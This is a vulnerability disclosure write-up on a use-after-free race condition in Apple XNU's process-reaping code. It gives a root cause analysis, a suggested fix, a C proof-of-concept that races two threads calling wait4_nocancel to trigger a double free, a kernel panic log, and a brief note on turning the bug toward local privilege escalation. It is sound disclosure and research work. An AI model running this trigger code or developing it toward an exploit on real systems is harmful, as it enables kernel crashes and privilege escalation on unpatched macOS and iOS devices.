---
layout: default
author: juwei lin
date: 2019-02-15 09:52:00 +0800
---

# Apple XNU UAF 

## Overview
This is a XNU Use-after-free case, after calling `os_reason_free` in `reap_child_locked`, child->p_exit_reason becomes a dangling pointer. In normal condition, reap_child_locked will remove the child proc off the parent proc list thus we cannot call reap_child_locked twice, but reap_child_locked is not always thread safe, we can use 2 threads to do race condition.  

## Root Cause Analysis
As showed in the PanicLog, this case is of type UAF since the mutext lock becomes illegal. Let's have a look at the root cause.  
  
In function reap_child_locked:  
```C
static int
reap_child_locked(proc_t parent, proc_t child, int deadparent, int reparentedtoinit, int locked, int droplock)
{
    ...
    proc_t trace_parent = PROC_NULL;	/* Traced parent process, if tracing */

	if (locked == 1)
		proc_list_unlock(); ---(1.a)
	
    ...

    os_reason_free(child->p_exit_reason);   ---(1.b)

    ...

	proc_list_lock();   ---(1.c)
	LIST_REMOVE(child, p_list);	/* off zombproc */
	parent->p_childrencnt--;
	LIST_REMOVE(child, p_sibling);
	/* If there are no more children wakeup parent */
	if ((deadparent != 0) && (LIST_EMPTY(&parent->p_children)))
		wakeup((caddr_t)parent);	/* with list lock held */
	child->p_listflag &= ~P_LIST_WAITING;
	wakeup(&child->p_stat);

	/* Take it out of process hash */
	LIST_REMOVE(child, p_hash);
	child->p_listflag &= ~P_LIST_INHASH;
	proc_checkdeadrefs(child);
	nprocs--;

    ...    
}
```
At 1.a, this function will unlock the proc_list if locked; At 1.b, os_reason_free will free the exit reason if the reference count becomes 0, but after free, child->p_exit_reason becomes a dangling pointer since it is not zeroed. At 1.c, the child proc is removed from its parent's proc list so that we cannot do any operations against the child proc any more.  
But this function is not thread safe, as you can see in the panic log stack, _wait4_nocancel calls reap_child_locked without lock:  
```C
int
wait4_nocancel(proc_t q, struct wait4_nocancel_args *uap, int32_t *retval)
{
    ...

    proc_list_lock();

    ...

	PCHILDREN_FOREACH(q, p) {   ---(2.a)
		if ( p->p_sibling.le_next != 0 )
			sibling_count++;
		if (uap->pid != WAIT_ANY &&
		    p->p_pid != uap->pid &&
		    p->p_pgrpid != -(uap->pid))
			continue;
    ...

	if (p->p_stat == SZOMB) {   ---(2.b)
		int reparentedtoinit = (p->p_listflag & P_LIST_DEADPARENT) ? 1 : 0;

		proc_list_unlock(); ---(2.c)

        (void)reap_child_locked(q, p, 0, reparentedtoinit, 0, 0);   ---(2.d)

        return (0);
    }
}
```
At 2.a, the child proc is searched within lock; At 2.b, if the child proc is in state SZOMB(zombie), it will firstly unlock the proc_list and then call reap_child_locked at 2.d.  
The problem is that, at 2.c, it unlocks the proc_list so that another thread can now obtain the same child proc `p`, then two threads now call reap_child_locked with the same child proc p.  
reap_child_locked calls os_reason_free with the same p:  
```C
void
os_reason_free(os_reason_t cur_reason)
{
	if (cur_reason == OS_REASON_NULL) { ---(3.a)
		return;
	}

	lck_mtx_lock(&cur_reason->osr_lock);

	if (cur_reason->osr_refcount == 0) {
		panic("os_reason_free called on reason with zero refcount");
	}

	cur_reason->osr_refcount--;
	if (cur_reason->osr_refcount != 0) {
		lck_mtx_unlock(&cur_reason->osr_lock);
		return;
	}

	os_reason_dealloc_buffer(cur_reason);

	lck_mtx_unlock(&cur_reason->osr_lock);
	lck_mtx_destroy(&cur_reason->osr_lock, os_reason_lock_grp);

	zfree(os_reason_zone, cur_reason);
}
```
At 3.a, os_reason_free checks if cur_reason equals NULL. You can bypass this check by killing the child proc with reason 9. Then this function free all the resouces and reason itself.   
So the first thread frees the exit reason and makes child->p_exit_reason a dangling pointer; the second thread does double free child->p_exit_reason again.  
A potential attack is to refill the freed buffer with some interesting bytes, e.g. ipc_port and then the second thread can help free the target ipc_port.  
A potential fix is to set child->p_exit_reason to NULL with lock protection or within an atomic instruction.  
  
## PoC Code
The following PoC code is not stable for triggering the UAF vulnerability but can help understand the root cause.  
```C
#include <iostream>
#include <unistd.h>
#include <sys/proc_info.h>
#include <sys/syscall.h>


#define PROC_INFO_CALL_PIDINFO          0x2
#define PROC_PIDEXITREASONINFO          24
#define PROC_PIDEXITREASONBASICINFO     25

#define    SYS_kill             37
#define    SYS_proc_info        336
#define    SYS_wait4_nocancel 400

#define WQOPS_THREAD_RETURN        0x04


bool thread1started = false;
bool thread2started = false;
bool stopthread1 = false;
bool stopthread2 = false;
bool start_try = false;
pid_t g_pid = 0;

int proc_info(int32_t callnum,int32_t pid,uint32_t flavor, uint64_t arg,user_addr_t buffer,int32_t buffersize) {
    return syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize);
}

int kill(int pid, int signum, int posix) {
    return syscall(SYS_kill, pid, signum, posix);
}

int wait4_nocancel(int pid, user_addr_t status, int options, user_addr_t rusage) {
    return syscall(SYS_wait4_nocancel, pid, status, options, rusage);
}

// proc_info->proc_pidbsdinfo will get the bsdinfo
// callnum: PROC_INFO_CALL_PIDINFO
// pid
// flavor: PROC_PIDTBSDINFO
// arg: 1
// buffer
// buffersize
void print_pid_info(int pid) {
    proc_bsdinfo info;
    
    memset(&info, 0, sizeof(info));
    int iret = proc_info(PROC_INFO_CALL_PIDINFO, pid, PROC_PIDTBSDINFO, 1, (user_addr_t)&info, sizeof(info));
    printf("print_pid_info:\n");
    printf("iret: %d\n", iret);
    printf("pid: %d\n", pid);
    printf("status: 0x%x\n", info.pbi_status);
}

// proc_info->proc_pidexitreasoninfo will get the exitreason info
// callnum: PROC_INFO_CALL_PIDINFO
// pid
// flavor: PROC_PIDEXITREASONINFO
// arg: 1
// buffer
// buffersize

void print_basic_exit_reason(int pid) {
    proc_exitreasonbasicinfo info;
    
    memset(&info, 0, sizeof(info));
    
    int ret = proc_info(PROC_INFO_CALL_PIDINFO, pid, PROC_PIDEXITREASONBASICINFO, 1, (user_addr_t)&info, sizeof(info));
    if (ret == 0) {
        printf("get basic information ok\n");
    } else {
        printf("get basic information failure, err:%d\n", ret);
    }
    
    printf("pid: %d\n", pid);
    printf("eri_code: 0x%llx\n", info.beri_code);
    printf("eri_reason_buf_size: 0x%x\n", info.beri_reason_buf_size);
}

void one_try() {
    pid_t pid = fork();
    
    if (pid == 0) {
        // child
        //set_proc_exit_reason();
        sleep(100);
        
        return;
    } else {
        kill(pid, 9, 0);
        sleep(2);
        
        /*int iret = 0;
         printf("1st time:\n");
         print_pid_info(pid);
         print_basic_exit_reason(pid);
         
         printf("2nd time, call wait4\n");
         print_pid_info(pid);
         iret = wait4_nocancel(pid, 0, 0, 0);
         printf("wait4 ret: 0x%x\n",iret);
         print_basic_exit_reason(pid);
         
         printf("3rd time, call wait4 again\n");
         print_pid_info(pid);
         iret = wait4_nocancel(pid, 0, 0, 0);
         printf("wait4 ret: 0x%x\n",iret);
         print_basic_exit_reason(pid);*/
        g_pid = pid;
        start_try = true;
        sleep(2);
        g_pid = 0;
        start_try = false;
        
    }
}

void* thread1(void*) {
    thread1started = true;
    int iret = 0;
    
    while (!stopthread1) {
        if (g_pid && start_try==true) {
            iret = wait4_nocancel(g_pid, 0, 0, 0);
            if (iret >= 0) printf("thread1 iret: %d\n", iret);
        }
        
    }
    return NULL;
}

void* thread2(void*) {
    thread2started = true;
    int iret = 0;
    while (!stopthread2) {
        if (g_pid && start_try==true) {
            iret = wait4_nocancel(g_pid, 0, 0, 0);
            if (iret >= 0) printf("thread2 iret: %d\n", iret);
        }
    }
    return NULL;
}

int main(int argc, const char * argv[]) {

    pthread_t t1, t2;
    
    pthread_create(&t1, NULL, thread1, NULL);
    pthread_create(&t2, NULL, thread2, NULL);
    
    while(!thread1started || !thread2started);
    
    for (int i=0; i<100; i++) {
        printf("try: %d/100\n", i+1);
        one_try();
        sleep(1);
    }
    
    stopthread1 = stopthread2 = true;
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    
    return 0;
}

```
## Panic Log
```
Anonymous UUID:       039B94D9-F271-8A3F-BAE4-C8BF9D6B5BEE

Tue Oct 23 01:24:02 2018

*** Panic Report ***
panic(cpu 0 caller 0xffffff8028297f8c): Kernel trap at 0xffffff802828f547, type 13=general protection, registers:
CR0: 0x000000008001003b, CR2: 0x0000010000000000, CR3: 0x000000000beee0ca, CR4: 0x00000000001606e0
RAX: 0xc0ffee9e0fce50c0, RBX: 0x000000477ae121b2, RCX: 0x00000000dfadbeef, RDX: 0xffffff8032cc76e0
RSP: 0xffffff802d5bbd60, RBP: 0xffffff802d5bbd90, RSI: 0x0000000000000002, RDI: 0xffffff8032cc76e0
R8:  0xffffff803a3ad000, R9:  0xffffff8028ab1588, R10: 0x0000000000000000, R11: 0x0000000000000000
R12: 0x000000477ae1217f, R13: 0x0000000000000000, R14: 0x000000477aeae57f, R15: 0xffffff8032cc76e0
RFL: 0x0000000000010086, RIP: 0xffffff802828f547, CS:  0x0000000000000008, SS:  0x0000000000000010
Fault CR2: 0x0000010000000000, Error code: 0x0000000000000000, Fault CPU: 0x0 VMM, PL: 1, VF: 0

Backtrace (CPU 0), Frame : Return Address
0xffffff8027f5c270 : 0xffffff8028126776 mach_kernel : _handle_debugger_trap + 0x456
0xffffff8027f5c2c0 : 0xffffff80282a81a4 mach_kernel : _kdp_i386_trap + 0x164
0xffffff8027f5c300 : 0xffffff8028297d42 mach_kernel : _kernel_trap + 0x3c2
0xffffff8027f5c380 : 0xffffff80280bd1d0 mach_kernel : trap_from_kernel + 0x26
0xffffff8027f5c3a0 : 0xffffff8028125e4b mach_kernel : _panic_trap_to_debugger + 0x18b
0xffffff8027f5c4d0 : 0xffffff8028125c9c mach_kernel : _panic + 0x5c
0xffffff8027f5c530 : 0xffffff8028297f8c mach_kernel : _kernel_trap + 0x60c
0xffffff8027f5c6b0 : 0xffffff80280bd1d0 mach_kernel : trap_from_kernel + 0x26
0xffffff8027f5c6d0 : 0xffffff802828f547 mach_kernel : _lck_mtx_lock_spinwait_x86 + 0xf7
0xffffff802d5bbd90 : 0xffffff80280bba41 mach_kernel : _lck_mtx_lock + 0x201
0xffffff802d5bbdb0 : 0xffffff80287af8d0 mach_kernel : _os_reason_free + 0x20
0xffffff802d5bbde0 : 0xffffff80286f39d2 mach_kernel : _reap_child_locked + 0x2a2
0xffffff802d5bbe30 : 0xffffff80286f5a2d mach_kernel : _wait4_nocancel + 0x87d
0xffffff802d5bbf20 : 0xffffff80287bfe60 mach_kernel : _unix_syscall64 + 0x3c0
0xffffff802d5bbfa0 : 0xffffff80280bd9b6 mach_kernel : _hndl_unix_scall64 + 0x16
```
## Q & A

### How did you find this vulnerability?
by fuzzing.

### Can you identify exploitability?
This is a **UAF** vulnerability. It can help do LPE.

### Can you identify root cause?
Yes, see the root cause analysis.

### Vulnerable software and hardware
macOS 10.14.3 and all before
iOS 12.1.3 and all before